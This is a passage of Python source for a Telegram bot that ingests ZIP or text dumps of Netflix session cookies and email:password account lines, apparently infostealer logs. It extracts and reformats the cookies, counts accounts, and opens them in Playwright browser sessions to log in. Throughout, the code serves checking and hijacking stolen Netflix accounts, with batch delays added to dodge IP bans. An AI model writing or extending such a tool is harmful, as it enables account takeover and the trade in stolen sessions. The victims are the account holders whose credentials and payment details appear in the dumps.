            text=f"📁 Processing ZIP file... Processing batch {i//batch_size + 1}/{(len(cookies_list) + batch_size - 1)//batch_size} ({len(batch)} files in parallel)...",
            parse_mode='Markdown'
        )
        
        # Process batch in parallel
        tasks = [process_single_cookie(cookie_data, i + j) for j, cookie_data in enumerate(batch)]
        batch_results = await asyncio.gather(*tasks)
        results.extend(batch_results)
        
        # Safety delay between batches to prevent IP ban
        if i + batch_size < len(cookies_list):
            print(f"🛡️ Safety delay between batches to prevent IP ban...")
            await asyncio.sleep(10)  # 10 second delay between batches
    
    return results

async def process_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process uploaded text file"""
    try:
        # Send immediate processing message
        processing_msg = await update.message.reply_text("📄 Processing text file... Please wait.")
        
        # Get the file
        file = await context.bot.get_file(update.message.document.file_id)
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp()
        
        # Download the text file with timeout
        txt_path = os.path.join(temp_dir, "uploaded.txt")
        try:
            await asyncio.wait_for(file.download_to_drive(txt_path), timeout=60.0)  # 60 second timeout
        except asyncio.TimeoutError:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text="❌ Error: File download timed out. Please try again with a smaller file."
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        except Exception as e:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=f"❌ Error downloading file: {str(e)}"
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        
        # Read the text file content
        try:
            with open(txt_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().strip()
        except Exception as e:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=f"❌ Error reading text file: {str(e)}"
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        
        if not content:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text="❌ The text file is empty."
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        
        # Process the text content using the pattern processor with timeout
        try:
            result = await asyncio.wait_for(
                asyncio.to_thread(text_processor.process_text_file, content),
                timeout=30.0  # 30 second timeout for processing
            )
        except asyncio.TimeoutError:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text="❌ Error: Text processing timed out. The file might be too large or complex."
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        except Exception as e:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=f"❌ Error processing text content: {str(e)}"
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        
        # Format the response with timeout protection
        try:
            response = await asyncio.wait_for(
                asyncio.to_thread(text_processor.format_response, result),
                timeout=10.0  # 10 second timeout for formatting
            )
            
            # Generate formatted text file content
            text_file_content = await asyncio.wait_for(
                asyncio.to_thread(text_processor.format_text_file_content, result),
                timeout=10.0  # 10 second timeout for formatting
            )
        except asyncio.TimeoutError:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text="❌ Error: Response formatting timed out."
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        except Exception as e:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=f"❌ Error formatting response: {str(e)}"
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        
        # Create a temporary text file with the formatted content
        output_txt_path = os.path.join(temp_dir, "processed_accounts.txt")
        try:
            with open(output_txt_path, 'w', encoding='utf-8') as f:
                f.write(text_file_content)
        except Exception as e:
            logger.error(f"Error creating output text file: {e}")
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text="❌ Error creating output file."
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        
        # Update the processing message with results
        try:
            await asyncio.wait_for(
                context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=processing_msg.message_id,
                    text=response
                ),
                timeout=10.0  # 10 second timeout for message update
            )
        except asyncio.TimeoutError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error: Message update timed out."
            )
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return
        
        # Store TXT data for later use
        context.user_data['txt_data'] = {
            'content': content,
            'result': result,
            'temp_dir': temp_dir
        }
        
        # Send the formatted text file with dynamic filename based on account count
        try:
            total_accounts = result.get('total_accounts', 0)
            dynamic_filename = f"{total_accounts}x Accounts.txt"
            
            with open(output_txt_path, 'rb') as f:
                await asyncio.wait_for(
                    context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=dynamic_filename,
                        caption=f"📄 Here's your processed accounts file with {total_accounts} accounts."
                    ),
                    timeout=30.0  # 30 second timeout for file sending
                )
        except asyncio.TimeoutError:
            logger.error("Error sending text file: Timeout")
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error: File sending timed out. Please try again."
            )
        except Exception as e:
            logger.error(f"Error sending text file: {e}")
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error sending the processed text file."
            )
        
        # Add continue view button for Netflix accounts
        pattern_type = result.get('pattern_type', 'unknown')
        total_accounts = result.get('total_accounts', 0)
        
        if pattern_type == 'netflix_account' and total_accounts > 0:
            # Create inline keyboard with continue view button
            keyboard = [[
                InlineKeyboardButton("👁️ Continue View", callback_data="continue_view_txt")
            ]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Update the processing message with button
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=response,
                reply_markup=reply_markup
            )
        else:
            # Clean up temporary directory if no continue view needed
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
        
    except Exception as e:
        logger.error(f"Error processing text file: {e}")
        await update.message.reply_text(f"❌ Error: Failed to process the text file. Error: {str(e)}")

async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process uploaded ZIP file"""
    try:
        # Send immediate processing message
        processing_msg = await update.message.reply_text("📁 Processing ZIP file... Please wait.")
        
        # Get the file
        file = await context.bot.get_file(update.message.document.file_id)
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp()
        
        # Download the ZIP file
        zip_path = os.path.join(temp_dir, "uploaded.zip")
        await file.download_to_drive(zip_path)
        
        # Store ZIP data for later use - store the actual file content
        with open(zip_path, 'rb') as f:
            zip_content = f.read()
        
        context.user_data['zip_data'] = {
            'zip_content': zip_content,
            'temp_dir': temp_dir
        }
        
        # Extract ZIP file
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        # Find all .txt files
        txt_files = find_txt_files(extract_dir)
        
        # Count total .txt files
        total_count = len(txt_files)
        
        # Count Netflix cookies and create text file
        netflix_count = 0
        txt_file_names = []
        
        for txt_file in txt_files:
            try:
                # Get relative path from extract directory
                rel_path = os.path.relpath(txt_file, extract_dir)
                
                # Extract only email part if @ is found in filename
                filename = os.path.basename(rel_path)
                if '@' in filename:
                    # Find the complete email address
                    email_part = ""
                    at_index = filename.find('@')
                    if at_index != -1:
                        # Find the start of email (before @)
                        email_start = 0
                        for i in range(at_index - 1, -1, -1):
                            if filename[i] in ['_', '\\', '/']:
                                email_start = i + 1
                                break
                        
                        # Find the end of email (after @, before underscore only)
                        email_end = len(filename)
                        for i in range(at_index + 1, len(filename)):
                            if filename[i] == '_':
                                email_end = i
                                break
                        
                        email_part = filename[email_start:email_end]
                    extracted_name = email_part
                else:
                    # If no @ found, use the original filename
                    extracted_name = filename
                
                # Read the content of the .txt file
                try:
                    with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                        file_content = f.read().strip()
                except Exception as e:
                    file_content = f"Error reading file: {str(e)}"
                
                # Check if it's Netflix cookies
                if file_content and "netflix.com" in file_content.lower():
                    netflix_count += 1
                    txt_file_names.append({
                        'name': extracted_name,
                        'content': file_content,
                        'type': 'netflix'
                    })
                else:
                    # For non-Netflix files
                    txt_file_names.append({
                        'name': extracted_name,
                        'content': file_content,
                        'type': 'normal'
                    })
            except Exception as e:
                logger.error(f"Error processing file {txt_file}: {e}")
                continue
        
        # Store processed cookies globally for command access
        global processed_cookies, session_state
        processed_cookies = [item for item in txt_file_names if item['type'] == 'netflix']
        
        # Update session state
        session_state['all_cookies'] = processed_cookies
        session_state['total_cookies'] = len(processed_cookies)
        session_state['current_page'] = 0
        
        # Create the text file with file names and content
        output_file_path = os.path.join(temp_dir, "txt_files_list.txt")
        with open(output_file_path, 'w', encoding='utf-8') as f:
            for i, file_data in enumerate(txt_file_names, 1):
                f.write(f"{file_data['name']}\n")
                f.write(f"Content:\n{file_data['content']}\n")
                if i < len(txt_file_names):  # Add separator and double space between files except for last one
                    f.write("\n")
                    f.write("-" * 50 + "\n")  # Separator line
                    f.write("\n")
        
        # Send the text file immediately
        with open(output_file_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename="txt_files_list.txt",
                caption=f"📋 List of all {total_count} .txt files found in the ZIP"
            )
        
        # Prepare response
        if total_count == 0:
            response = "📁 **ZIP File Analysis Complete:**\n\n❌ No .txt files found in the ZIP file."
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=response,
                parse_mode='Markdown'
            )
        else:
            response = f"📁 **ZIP File Analysis Complete:**\n\n✅ Found **{total_count}** .txt file(s) in the ZIP file."
            
            if netflix_count > 0:
                response += f"\n🎬 Found **{netflix_count}** Netflix cookie file(s)"
            
            # Create inline keyboard with continue view button only
            keyboard = []
            if netflix_count > 0:
                keyboard.append([
                    InlineKeyboardButton("👁️ Continue View", callback_data="continue_view")
                ])
            
            reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
            
            # Update the processing message with results and button
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=response,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        
    except zipfile.BadZipFile:
        await update.message.reply_text("❌ Error: The file is not a valid ZIP file.")
    except Exception as e:
        logger.error(f"Error processing ZIP file: {e}")
        await update.message.reply_text(f"❌ Error: Failed to process the ZIP file. Error: {str(e)}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming messages"""
    try:
        # Check if it's a text message
        if update.message and update.message.text:
            text = update.message.text.strip()
            
            # First check if we're waiting for a start number response
            if await handle_start_number_response(update, context):
                return
            
            # Handle number commands like /1, /2, etc.
            if text.startswith('/') and text[1:].isdigit():
                cookie_number = int(text[1:])
                if 'processed_cookies' in globals() and processed_cookies:
                    await open_specific_cookie(cookie_number, update, context)
                else:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text="❌ Please send a ZIP file or TXT file first before using number commands."
                    )
            # Handle Netflix ID messages
            elif text.startswith('NetflixId='):
                await handle_netflix_id_message(update, context)
            # Handle direct Netflix cookies in tab-separated or space-separated format
            elif text.startswith('.netflix.com'):
                await handle_direct_netflix_cookies(update, context, text)
            else:
                # Handle other text messages
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="📝 Please send a ZIP file with Netflix cookies, a TXT file for analysis, a Netflix ID message, or direct Netflix cookies to get started!"
                )
        
        # Check if it's a document (ZIP file or text file)
        elif update.message and update.message.document:
            await handle_document(update, context)
        
        # Handle other message types
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="📝 Please send a ZIP file with Netflix cookies, a TXT file for analysis, or a Netflix ID message to get started!"
            )
            
    except Exception as e:
        logger.error(f"Error in handle_message: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Error processing message. Please try again."
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document uploads (ZIP files and text files)"""
    try:
        # Check if it's a ZIP file
        document = update.message.document
        if document.file_name.lower().endswith('.zip'):
            await process_zip_file(update, context)
        elif document.file_name.lower().endswith('.txt'):
            await process_text_file(update, context)
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Please send a ZIP file containing Netflix cookies or a TXT file for analysis."
            )
    except Exception as e:
        logger.error(f"Error in handle_document: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Error processing document. Please try again."
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f'Update {update} caused error {context.error}')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button clicks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "continue_view":
        # Delete the "ZIP File Analysis Complete" message
        try:
            await query.delete_message()
        except Exception as e:
            # Ignore errors if message is already deleted
            pass
        
        # Get the stored data from context
        if 'zip_data' in context.user_data:
            zip_data = context.user_data['zip_data']
            await ask_for_start_number(update, context, zip_data, "zip")
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error: No ZIP data found. Please send the ZIP file again."
            )
    
    elif query.data == "continue_view_txt":
        # Get the stored TXT data from context
        if 'txt_data' in context.user_data:
            txt_data = context.user_data['txt_data']
            await ask_for_start_number(update, context, txt_data, "txt")
        else:
            await query.edit_message_text("❌ Error: No TXT data found. Please send the TXT file again.")
    
    elif query.data.startswith("prev_page_"):
        page_number = int(query.data.split("_")[-1])
        if 'zip_data' in context.user_data:
            await process_continue_view(update, context, context.user_data['zip_data'], page_number - 1)
        elif 'txt_data' in context.user_data:
            await process_continue_view_txt(update, context, context.user_data['txt_data'], page_number - 1)
    
    elif query.data.startswith("next_page_"):
        page_number = int(query.data.split("_")[-1])
        if 'zip_data' in context.user_data:
            await process_continue_view(update, context, context.user_data['zip_data'], page_number + 1)
        elif 'txt_data' in context.user_data:
            await process_continue_view_txt(update, context, context.user_data['txt_data'], page_number + 1)
    
    elif query.data.startswith("next_batch_"):
        start_index = int(query.data.split("_")[-1])
        if 'zip_data' in context.user_data:
            zip_data = context.user_data['zip_data']
            await process_continue_view_with_start_number(update, context, zip_data, start_index + 1)
        elif 'txt_data' in context.user_data:
            txt_data = context.user_data['txt_data']
            await process_continue_view_txt_with_start_number(update, context, txt_data, start_index + 1)
    
    elif query.data == "close_sessions":
        chat_id = update.effective_chat.id
        if chat_id in active_browsers:
            try:
                # Close all contexts and browser
                browser_data = active_browsers[chat_id]
                for context in browser_data['contexts']:
                    try:
                        await context.close()
                    except:
                        pass
                
                try:
                    await browser_data['browser'].close()
                except:
                    pass
                
                try:
                    await browser_data['playwright'].stop()
                except:
                    pass
                
                # Remove from global manager
                del active_browsers[chat_id]
                
                await query.edit_message_text("✅ All browser sessions closed successfully!")
            except Exception as e:
                await query.edit_message_text(f"❌ Error closing sessions: {str(e)[:50]}...")
        else:
            await query.edit_message_text("✅ No active sessions to close.")
    
    elif query.data.startswith("translate_"):
        if query.data == "translate_direct":
            await translate_direct_session_to_english(update, context)
        else:
            session_number = int(query.data.split("_")[-1])
            await translate_session_to_english(update, context, session_number)

async def process_continue_view(update: Update, context: ContextTypes.DEFAULT_TYPE, zip_data, page_number=0):
    """Process continue view functionality with pagination"""
    query = update.callback_query
    
    try:
        # Create temporary directory
        temp_dir = tempfile.mkdtemp()
        
        # Write ZIP content to temporary file
        zip_path = os.path.join(temp_dir, "uploaded.zip")
        with open(zip_path, 'wb') as f:
            f.write(zip_data['zip_content'])
        
        # Extract ZIP file
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        # Find all .txt files
        txt_files = find_txt_files(extract_dir)
        
        # Separate Netflix cookies from other files
        netflix_cookies_list = []
        
        for txt_file in txt_files:
            try:
                # Get relative path from extract directory
                rel_path = os.path.relpath(txt_file, extract_dir)
                
                # Extract only email part if @ is found in filename
                filename = os.path.basename(rel_path)
                if '@' in filename:
                    # Find the complete email address
                    email_part = ""
                    at_index = filename.find('@')
                    if at_index != -1:
                        # Find the start of email (before @)
                        email_start = 0
                        for i in range(at_index - 1, -1, -1):
                            if filename[i] in ['_', '\\', '/']:
                                email_start = i + 1
                                break
                        
                        # Find the end of email (after @, before underscore only)
                        email_end = len(filename)
                        for i in range(at_index + 1, len(filename)):
                            if filename[i] == '_':
                                email_end = i
                                break
                        
                        email_part = filename[email_start:email_end]
                    extracted_name = email_part
                else:
                    # If no @ found, use the original filename
                    extracted_name = filename
                
                # Read the content of the .txt file
                try:
                    with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                        file_content = f.read().strip()
                except Exception as e:
                    file_content = f"Error reading file: {str(e)}"
                
                # Check if it's Netflix cookies
                if file_content and "netflix.com" in file_content.lower():
                    netflix_cookies_list.append({
                        'name': extracted_name,
                        'content': file_content
                    })
            except Exception as e:
                logger.error(f"Error processing file {txt_file}: {e}")
                continue
        
        # Open cookies in debug mode with pagination
        if netflix_cookies_list:
            await open_cookies_in_debug_mode(netflix_cookies_list, update, context, page_number)
        else:
            await query.edit_message_text("❌ No Netflix cookies found to open.")
        
        # Clean up temporary directory
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in continue view: {e}")
        await query.edit_message_text(f"❌ Error during continue view: {str(e)}")

async def process_continue_view_txt(update: Update, context: ContextTypes.DEFAULT_TYPE, txt_data, page_number=0):
    """Process continue view functionality for TXT files with pagination"""
    query = update.callback_query
    
    try:
        # Get the processed result from txt_data
        result = txt_data['result']
        accounts = result.get('accounts', [])
        
        if not accounts:
            await query.edit_message_text("❌ No accounts found to display.")
            return
        
        # Create a list of Netflix cookies from the accounts
        netflix_cookies_list = []
        for i, account in enumerate(accounts, 1):
            # Extract Netflix cookies from the account details
            cookies = account.get('cookies', '')
            full_content = account.get('full_content', '')
            
            # Look for Netflix cookie format in cookies field or full_content
            netflix_cookie_content = ""
            
            # First try to extract from cookies field
            if cookies and ('NetflixId=' in cookies and 'SecureNetflixId=' in cookies):
                netflix_cookie_content = cookies
            # If not found in cookies field, try to extract from full_content
            elif full_content and ('NetflixId=' in full_content and 'SecureNetflixId=' in full_content):
                # Extract the cookie part from full_content using regex
                # Look for "Cookies: " or "Cookies = " followed by the cookie string
                cookie_match = re.search(r'Cookies\s*[:=]\s*([^|\n]+)', full_content)
                if cookie_match:
                    netflix_cookie_content = cookie_match.group(1).strip()
                else:
                    # If regex doesn't work, try to find the cookie part manually
                    # Look for the part that contains NetflixId= and SecureNetflixId=
                    lines = full_content.split('\n')
                    for line in lines:
                        if 'NetflixId=' in line and 'SecureNetflixId=' in line:
                            netflix_cookie_content = line.strip()
                            break
            
            # If we found Netflix cookies, convert them to tab-separated format
            if netflix_cookie_content and ('NetflixId=' in netflix_cookie_content and 'SecureNetflixId=' in netflix_cookie_content):
                # Convert Netflix cookie format to tab-separated format
                converted_cookies = convert_netflix_cookies_to_tab_format(netflix_cookie_content)
                netflix_cookies_list.append({
                    'name': f"Account_{i}",
                    'content': converted_cookies
                })
            else:
                # Fallback to the original method if no Netflix cookies found
                cookie_content = account.get('full_content', '')
                if not cookie_content:
                    # If no full_content, create from individual fields
                    email = account.get('email', '')
                    password = account.get('password', '')
                    details = f"Country = {account.get('country', 'Unknown')} | memberPlan = {account.get('member_plan', 'Unknown')} | memberSince = {account.get('member_since', 'Unknown')} | videoQuality = {account.get('video_quality', 'Unknown')} | phonenumber = {account.get('phone_number', 'Unknown')} | maxStreams = {account.get('max_streams', 'Unknown')} | paymentType = {account.get('payment_type', 'Unknown')} | isVerified = {account.get('is_verified', 'Unknown')} | Total_CC = {account.get('total_cc', 'Unknown')} | Cookies = {account.get('cookies', 'Unknown')}"
                    cookie_content = f"{email}:{password}:{details}"
                
                netflix_cookies_list.append({
                    'name': f"Account_{i}",
                    'content': cookie_content
                })
        
        # Open cookies in debug mode with pagination
        if netflix_cookies_list:
            await open_cookies_in_debug_mode(netflix_cookies_list, update, context, page_number)
        else:
            await query.edit_message_text("❌ No Netflix accounts found to open.")
        
        # Clean up temporary directory
        try:
            shutil.rmtree(txt_data['temp_dir'])
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in continue view TXT: {e}")
        await query.edit_message_text(f"❌ Error during continue view: {str(e)}")

def convert_netflix_cookies_to_tab_format(netflix_cookies):
    """Convert Netflix cookies from format 'NetflixId=...;SecureNetflixId=...' to tab-separated format"""
    try:
        import urllib.parse
        
        # Clean the cookie string - remove any extra text before or after the cookies
        # Extract only the part that contains NetflixId= and SecureNetflixId=
        if 'NetflixId=' in netflix_cookies and 'SecureNetflixId=' in netflix_cookies:
            # Find the start of NetflixId=
            start_idx = netflix_cookies.find('NetflixId=')
            # Find the end of the last cookie (after the last SecureNetflixId=)
            end_idx = netflix_cookies.rfind('SecureNetflixId=')
            if end_idx != -1:
                # Find the end of the SecureNetflixId value (look for the end of the value)
                remaining = netflix_cookies[end_idx:]
                # Find the end of the value (could be end of string, semicolon, or space)
                value_end = len(remaining)
                for i, char in enumerate(remaining):
                    if char in [' ', '\n', '\t'] and i > 0:
                        value_end = i
                        break
                end_idx = end_idx + value_end
            
            # Extract the clean cookie string
            clean_cookies = netflix_cookies[start_idx:end_idx].strip()
        else:
            clean_cookies = netflix_cookies
        
        # Split the cookies by semicolon
        cookie_pairs = clean_cookies.split(';')
        tab_separated_cookies = []
        
        for cookie_pair in cookie_pairs:
            if '=' in cookie_pair:
                name, value = cookie_pair.strip().split('=', 1)
                name = name.strip()
                value = value.strip()
                
                # URL decode the value if it contains encoded characters
                try:
                    decoded_value = urllib.parse.unquote(value)
                except:
                    decoded_value = value
                
                # Create tab-separated format: domain, subdomain, path, secure, expiry, name, value
                # For Netflix cookies, we use .netflix.com domain for better compatibility
                tab_separated_cookies.append(f".netflix.com\t.netflix.com\t/\tTRUE\t1735689600\t{name}\t{decoded_value}")
        
        return '\n'.join(tab_separated_cookies)
    except Exception as e:
        logger.error(f"Error converting Netflix cookies: {e}")
        return netflix_cookies  # Return original if conversion fails

async def process_netflix_conversion(update: Update, context: ContextTypes.DEFAULT_TYPE, zip_data):
    """Process Netflix conversion when button is clicked"""
    query = update.callback_query
    
    # Update message to show processing
    await query.edit_message_text("🎬 Starting Netflix login process... Please wait.")
    
    try:
        # Create temporary directory
        temp_dir = tempfile.mkdtemp()
        
        # Write ZIP content to temporary file
        zip_path = os.path.join(temp_dir, "uploaded.zip")
        with open(zip_path, 'wb') as f:
            f.write(zip_data['zip_content'])
        
        # Extract ZIP file
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        # Find all .txt files
        txt_files = find_txt_files(extract_dir)
        
        # Separate Netflix cookies from other files
        netflix_cookies_list = []
        other_files = []
        
        for txt_file in txt_files:
            try:
                # Get relative path from extract directory
                rel_path = os.path.relpath(txt_file, extract_dir)
                
                # Extract only email part if @ is found in filename
                filename = os.path.basename(rel_path)
                if '@' in filename:
                    # Find the complete email address
                    email_part = ""
                    at_index = filename.find('@')
                    if at_index != -1:
                        # Find the start of email (before @)
                        email_start = 0
                        for i in range(at_index - 1, -1, -1):
                            if filename[i] in ['_', '\\', '/']:
                                email_start = i + 1
                                break
                        
                        # Find the end of email (after @, before underscore only)
                        email_end = len(filename)
                        for i in range(at_index + 1, len(filename)):
                            if filename[i] == '_':
                                email_end = i
                                break
                        
                        email_part = filename[email_start:email_end]
                    extracted_name = email_part
                else:
                    # If no @ found, use the original filename
                    extracted_name = filename
                
                # Read the content of the .txt file
                try:
                    with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                        file_content = f.read().strip()
                except Exception as e:
                    file_content = f"Error reading file: {str(e)}"
                
                # Check if it's Netflix cookies
                if file_content and "netflix.com" in file_content.lower():
                    netflix_cookies_list.append({
                        'name': extracted_name,
                        'content': file_content
                    })
                else:
                    # For non-Netflix files, just add to regular list
                    other_files.append({
                        'name': extracted_name,
                        'content': file_content,
                        'header_cookies': "Not Netflix cookies"
                    })
            except Exception as e:
                logger.error(f"Error processing file {txt_file}: {e}")
                continue
        
        # Process Netflix cookies in parallel
        if netflix_cookies_list:
            await query.edit_message_text(f"🎬 Processing {len(netflix_cookies_list)} Netflix cookies in parallel...")
            netflix_results = await process_netflix_cookies_parallel(netflix_cookies_list, update, context, query)
            all_results = other_files + netflix_results
        else:
            all_results = other_files
        
        # Create the text file with file names, content, and header cookies
        output_file_path = os.path.join(temp_dir, "txt_files_list.txt")
        with open(output_file_path, 'w', encoding='utf-8') as f:
            for i, file_data in enumerate(all_results, 1):
                f.write(f"{file_data['name']}\n")
                
                # Handle different types of results
                if file_data.get('status') == 'success':
                    # Successful login - use header string cookies
                    f.write(f"Header String Cookies (Replaced):\n{file_data['header_cookies']}\n")
                elif file_data.get('status') == 'failed':
                    # Failed login - keep original cookies with ❌ mark
                    f.write(f"Original Cookies:\n{file_data['content']}\n")
                    f.write(f"❌ {file_data['header_cookies']}\n")
                else:
                    # Non-Netflix files
                    f.write(f"Content:\n{file_data['content']}\n")
                
                if i < len(all_results):  # Add separator and double space between files except for last one
                    f.write("\n")
                    f.write("-" * 50 + "\n")  # Separator line
                    f.write("\n")
        
        # Send the text file
        with open(output_file_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename="txt_files_list.txt",
                caption=f"📋 Converted {len(all_results)} files with header string cookies"
            )
        
        # Update the message
        await query.edit_message_text("✅ Netflix conversion completed! Check the file above.")
        
        # Clean up temporary directory
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in Netflix conversion: {e}")
        await query.edit_message_text(f"❌ Error during Netflix conversion: {str(e)}")

async def translate_session_to_english(update: Update, context: ContextTypes.DEFAULT_TYPE, session_number):
    """Translate session to English"""
    query = update.callback_query
    
    try:
        await query.answer()
        await query.edit_message_text(f"🌐 Translating Session {session_number} to English...")
        
        # Get the stored data from context
        if 'zip_data' in context.user_data:
            zip_data = context.user_data['zip_data']
            
            # Create temporary directory
            temp_dir = tempfile.mkdtemp()
            
            # Write ZIP content to temporary file
            zip_path = os.path.join(temp_dir, "uploaded.zip")
            with open(zip_path, 'wb') as f:
                f.write(zip_data['zip_content'])
            
            # Extract ZIP file
            extract_dir = os.path.join(temp_dir, "extracted")
            os.makedirs(extract_dir, exist_ok=True)
            
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            
            # Find all .txt files
            txt_files = find_txt_files(extract_dir)
            
            # Find the specific cookie for this session number
            target_cookie = None
            netflix_cookies = []
            
            # First, collect all Netflix cookies
            for txt_file in txt_files:
                try:
                    # Get relative path from extract directory
                    rel_path = os.path.relpath(txt_file, extract_dir)
                    
                    # Extract only email part if @ is found in filename
                    filename = os.path.basename(rel_path)
                    if '@' in filename:
                        # Find the complete email address
                        email_part = ""
                        at_index = filename.find('@')
                        if at_index != -1:
                            # Find the start of email (before @)
                            email_start = 0
                            for i in range(at_index - 1, -1, -1):
                                if filename[i] in ['_', '\\', '/']:
                                    email_start = i + 1
                                    break
                            
                            # Find the end of email (after @, before underscore only)
                            email_end = len(filename)
                            for i in range(at_index + 1, len(filename)):
                                if filename[i] == '_':
                                    email_end = i
                                    break
                            
                            email_part = filename[email_start:email_end]
                        extracted_name = email_part
                    else:
                        # If no @ found, use the original filename
                        extracted_name = filename
                    
                    # Read the content of the .txt file
                    try:
                        with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                            file_content = f.read().strip()
                    except Exception as e:
                        file_content = f"Error reading file: {str(e)}"
                    
                    # Check if it's Netflix cookies
                    if file_content and "netflix.com" in file_content.lower():
                        netflix_cookies.append({
                            'name': extracted_name,
                            'content': file_content
                        })
                except Exception as e:
                    logger.error(f"Error processing file {txt_file}: {e}")
                    continue
            
            # Now find the specific session number
            if 1 <= session_number <= len(netflix_cookies):
                target_cookie = netflix_cookies[session_number - 1]  # Convert to 0-based index
                await perform_translate_to_english(update, context, target_cookie, session_number)
            else:
                await query.edit_message_text(f"❌ Session {session_number} not found. Total sessions: {len(netflix_cookies)}")
            
            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            
        else:
            await query.edit_message_text("❌ Error: No ZIP data found. Please send the ZIP file again.")
            
    except Exception as e:
        logger.error(f"Error in translate session: {e}")
        await query.edit_message_text(f"❌ Error during translate: {str(e)[:50]}...")

async def perform_translate_to_english(update: Update, context: ContextTypes.DEFAULT_TYPE, cookie_data, session_number):
    """Perform the actual translation to English"""
    query = update.callback_query
    
    try:
        async with async_playwright() as p:
            # Launch Firefox browser
            browser = await p.firefox.launch(
                headless=False,
                slow_mo=1000,
                args=[
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                ]
            )
            
            context_instance = await browser.new_context(
                viewport={'width': 800, 'height': 600}
            )
            page = await context_instance.new_page()
            
            # Clear all storage data for fresh session
            await context_instance.clear_cookies()
            
